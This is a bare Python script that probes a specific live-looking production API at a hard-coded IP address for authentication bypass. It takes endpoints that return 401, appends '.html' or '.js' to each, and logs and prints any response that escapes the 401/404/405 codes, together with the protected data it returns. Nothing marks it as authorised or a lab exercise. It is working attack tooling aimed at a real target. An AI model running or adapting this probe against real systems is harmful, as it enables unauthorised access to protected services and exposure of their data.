import urllib.request, json, time
base="http://144.123.22.234:9080/prod-api"
paths=[l.strip() for l in open('paths_401.txt') if l.strip()]
out=open('bypass_matrix.tsv','w')
out.write("path\tvariant\tstatus\tcode\tbody\n")
def get(u):
    req=urllib.request.Request(u,headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'})
    try:
        with urllib.request.urlopen(req,timeout=15) as r: return r.status, r.read(1500).decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read(1500).decode('utf-8','replace')
    except Exception as e: return -1,'ERR '+str(e)
def parse(b):
    try: return json.loads(b)
    except: return {}
for p in paths:
    for suf in ('.html','.js'):
        u=base+p+suf
        st,b=get(u)
        j=parse(b); code=j.get('code'); data=j.get('data')
        out.write(f"{p}\t{suf}\t{st}\t{code}\t{b[:300].replace(chr(9),' ')}\n"); out.flush()
        if code not in (401,404,405):
            print(f"HIT {p}{suf} -> http{st} code={code} msg={str(j.get('msg'))[:60]} data={str(data)[:200]}")
        time.sleep(0.35)
out.close()
print("DONE")
